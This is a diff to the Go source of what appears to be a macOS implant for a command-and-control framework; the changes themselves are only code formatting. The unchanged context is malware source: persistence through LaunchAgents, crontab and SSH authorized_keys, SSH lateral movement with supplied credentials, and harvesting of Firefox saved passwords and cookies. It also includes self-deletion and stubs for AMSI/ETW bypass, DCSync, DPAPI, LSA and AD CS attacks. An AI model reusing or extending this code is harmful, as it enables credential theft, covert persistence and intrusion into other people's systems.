@@ -67,7 +67,7 @@ func captureScreenRGBA() (*image.RGBA, error) {
 func applyHideWindow(cmd *exec.Cmd) {}
 
 func addPersistenceWindows() {}
-func addPersistenceLinux() {}
+func addPersistenceLinux()   {}
 
 // addPersistenceDarwin installs a LaunchAgent plist in ~/Library/LaunchAgents.
 func addPersistenceDarwin() {
@@ -388,16 +388,16 @@ var (
 
 // ptrace constants for macOS
 const (
-	PT_ATTACHEXC     = 14
-	PT_SIGEXC        = 0x0c
-	MaxTaskGID       = 44 // task_for_pid mach trap
-	mach_task_self   = -2
-	MACH_PORT_NULL   = 0
-	KERN_SUCCESS     = 0
-	VM_PROT_READ     = 1
-	VM_PROT_WRITE    = 2
-	VM_PROT_EXECUTE  = 4
-	VM_PROT_ALL      = 7
+	PT_ATTACHEXC            = 14
+	PT_SIGEXC               = 0x0c
+	MaxTaskGID              = 44 // task_for_pid mach trap
+	mach_task_self          = -2
+	MACH_PORT_NULL          = 0
+	KERN_SUCCESS            = 0
+	VM_PROT_READ            = 1
+	VM_PROT_WRITE           = 2
+	VM_PROT_EXECUTE         = 4
+	VM_PROT_ALL             = 7
 	MACH_MSG_TYPE_COPY_SEND = 15
 )
 
@@ -479,9 +479,15 @@ func lateralMove(spec string) (string, error) {
 	user := ""
 	pass := ""
 	cmd := "whoami"
-	if len(parts) > 2 { user = strings.TrimSpace(parts[2]) }
-	if len(parts) > 3 { pass = strings.TrimSpace(parts[3]) }
-	if len(parts) > 4 { cmd = strings.TrimSpace(parts[4]) }
+	if len(parts) > 2 {
+		user = strings.TrimSpace(parts[2])
+	}
+	if len(parts) > 3 {
+		pass = strings.TrimSpace(parts[3])
+	}
+	if len(parts) > 4 {
+		cmd = strings.TrimSpace(parts[4])
+	}
 
 	switch moveType {
 	case "ssh", "ssh_exec":
@@ -534,7 +540,9 @@ func lateralSSHDarwin(target, user, pass, cmd string) (string, error) {
 	if strings.Contains(target, ":") {
 		hostPort := strings.SplitN(target, ":", 2)
 		target = hostPort[0]
-		if p, err := strconv.Atoi(hostPort[1]); err == nil { port = p }
+		if p, err := strconv.Atoi(hostPort[1]); err == nil {
+			port = p
+		}
 	}
 
 	addr := fmt.Sprintf("%s:%d", target, port)
@@ -552,7 +560,9 @@ func lateralSSHDarwin(target, user, pass, cmd string) (string, error) {
 	defer client.Close()
 
 	session, err := client.NewSession()
-	if err != nil { return "", fmt.Errorf("SSH session failed: %w", err) }
+	if err != nil {
+		return "", fmt.Errorf("SSH session failed: %w", err)
+	}
 	defer session.Close()
 
 	var stdout, stderr bytes.Buffer
@@ -697,11 +707,11 @@ func executeAssemblyForkRun(b64Data string) (string, error) {
 	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
 }
 
-func rportfwdCollectOutbound() []socksFrame { return nil }
-func rportfwdHandleFrames(frames []socksFrame) {}
+func rportfwdCollectOutbound() []socksFrame     { return nil }
+func rportfwdHandleFrames(frames []socksFrame)  {}
 func rportfwdDial(connID uint64, target string) {}
-func rportfwdWrite(connID uint64, data []byte) {}
-func rportfwdClose(connID uint64) {}
+func rportfwdWrite(connID uint64, data []byte)  {}
+func rportfwdClose(connID uint64)               {}
 
 func kerberosDCSync(user string) (string, error) {
 	return "", fmt.Errorf("DCSync is Windows-only")
@@ -763,7 +773,9 @@ func stealBrowserData(browser string) string {
 	collectFirefoxPasswords := func(profileDir string) {
 		if entries, err := os.ReadDir(profileDir); err == nil {
 			for _, entry := range entries {
-				if !entry.IsDir() { continue }
+				if !entry.IsDir() {
+					continue
+				}
 				loginsPath := filepath.Join(profileDir, entry.Name(), "logins.json")
 				if fi, err := os.Stat(loginsPath); err == nil {
 					data, _ := os.ReadFile(loginsPath)
@@ -860,7 +872,9 @@ func exportCookies(browser string) string {
 		firefoxDir := filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles")
 		if entries, err := os.ReadDir(firefoxDir); err == nil {
 			for _, entry := range entries {
-				if !entry.IsDir() { continue }
+				if !entry.IsDir() {
+					continue
+				}
 				cookiePath := filepath.Join(firefoxDir, entry.Name(), "cookies.sqlite")
 				if fi, err := os.Stat(cookiePath); err == nil {
 					results = append(results, fmt.Sprintf("[Firefox] Cookies: %s (%d bytes)", cookiePath, fi.Size()))
@@ -1011,7 +1025,9 @@ func applyPersistence(method string, args string) string {
 		return "persistence: crontab entry already exists"
 	case "ssh", "ssh_authorized_keys":
 		home := os.Getenv("HOME")
-		if home == "" { return "persistence: HOME not set" }
+		if home == "" {
+			return "persistence: HOME not set"
+		}
 		sshDir := filepath.Join(home, ".ssh")
 		os.MkdirAll(sshDir, 0700)
 		if args != "" {
@@ -1116,7 +1132,9 @@ func removePersistence(method string, args string) string {
 		return "persistence: login item removed"
 	case "ssh", "ssh_authorized_keys":
 		home := os.Getenv("HOME")
-		if home == "" { return "persistence: HOME not set" }
+		if home == "" {
+			return "persistence: HOME not set"
+		}
 		authFile := filepath.Join(home, ".ssh", "authorized_keys")
 		if args != "" {
 			data, _ := os.ReadFile(authFile)
@@ -1191,13 +1209,13 @@ func uacBypass(method, payload string) string {
 
 func executeNetCommand(cmd string) string { return "net command suite is Windows-only" }
 
-func amsiBypass() string         { return "not supported on macOS" }
-func amsiSessionBypass() string  { return "not supported on macOS" }
-func etwBypass() string          { return "not supported on macOS" }
-func etwNtTraceEvent() string    { return "not supported on macOS" }
-func blockDLLs() string          { return "not supported on macOS" }
-func unhookNtdll() string        { return "not supported on macOS" }
-func protectProcess() string     { return "not supported on macOS" }
+func amsiBypass() string        { return "not supported on macOS" }
+func amsiSessionBypass() string { return "not supported on macOS" }
+func etwBypass() string         { return "not supported on macOS" }
+func etwNtTraceEvent() string   { return "not supported on macOS" }
+func blockDLLs() string         { return "not supported on macOS" }
+func unhookNtdll() string       { return "not supported on macOS" }
+func protectProcess() string    { return "not supported on macOS" }
 
 // selfDelete creates a cleanup script that removes the binary and process.
 func selfDelete() string {
@@ -1373,23 +1391,25 @@ func netScanSMBDiscovery() (string, error) {
 	return "", fmt.Errorf("SMB discovery is Windows-only")
 }
 
-func dpapiMasterKey() (string, error)       { return "", fmt.Errorf("DPAPI is Windows-only") }
+func dpapiMasterKey() (string, error)           { return "", fmt.Errorf("DPAPI is Windows-only") }
 func dpapiBlob(filePath string) (string, error) { return "", fmt.Errorf("DPAPI is Windows-only") }
-func dpapiBrowser() (string, error)         { return "", fmt.Errorf("DPAPI browser decryption is Windows-only") }
-func lsaBypass() (string, error)            { return "", fmt.Errorf("LSA bypass is Windows-only") }
-func adcsFind() (string, error)             { return "", fmt.Errorf("AD CS enumeration is Windows-only") }
+func dpapiBrowser() (string, error) {
+	return "", fmt.Errorf("DPAPI browser decryption is Windows-only")
+}
+func lsaBypass() (string, error) { return "", fmt.Errorf("LSA bypass is Windows-only") }
+func adcsFind() (string, error)  { return "", fmt.Errorf("AD CS enumeration is Windows-only") }
 func adcsRequest(template string) (string, error) {
 	return "", fmt.Errorf("AD CS certificate request is Windows-only")
 }
 func shadowCreds(target string) (string, error) {
 	return "", fmt.Errorf("Shadow Credentials is Windows-only")
 }
-func ldapQuery(filter string) (string, error)     { return "", fmt.Errorf("LDAP queries are Windows-only") }
-func ldapUsers() (string, error)                  { return "", fmt.Errorf("LDAP queries are Windows-only") }
-func ldapGroups() (string, error)                 { return "", fmt.Errorf("LDAP queries are Windows-only") }
-func ldapComputers() (string, error)              { return "", fmt.Errorf("LDAP queries are Windows-only") }
-func ldapSPN() (string, error)                  { return "", fmt.Errorf("LDAP queries are Windows-only") }
-func ldapACL() (string, error)                    { return "", fmt.Errorf("LDAP queries are Windows-only") }
+func ldapQuery(filter string) (string, error) { return "", fmt.Errorf("LDAP queries are Windows-only") }
+func ldapUsers() (string, error)              { return "", fmt.Errorf("LDAP queries are Windows-only") }
+func ldapGroups() (string, error)             { return "", fmt.Errorf("LDAP queries are Windows-only") }
+func ldapComputers() (string, error)          { return "", fmt.Errorf("LDAP queries are Windows-only") }
+func ldapSPN() (string, error)                { return "", fmt.Errorf("LDAP queries are Windows-only") }
+func ldapACL() (string, error)                { return "", fmt.Errorf("LDAP queries are Windows-only") }
 
 // NTLM relay & coerce stubs
 func coercePrinterBug(target, listenAddr string) (string, error) {
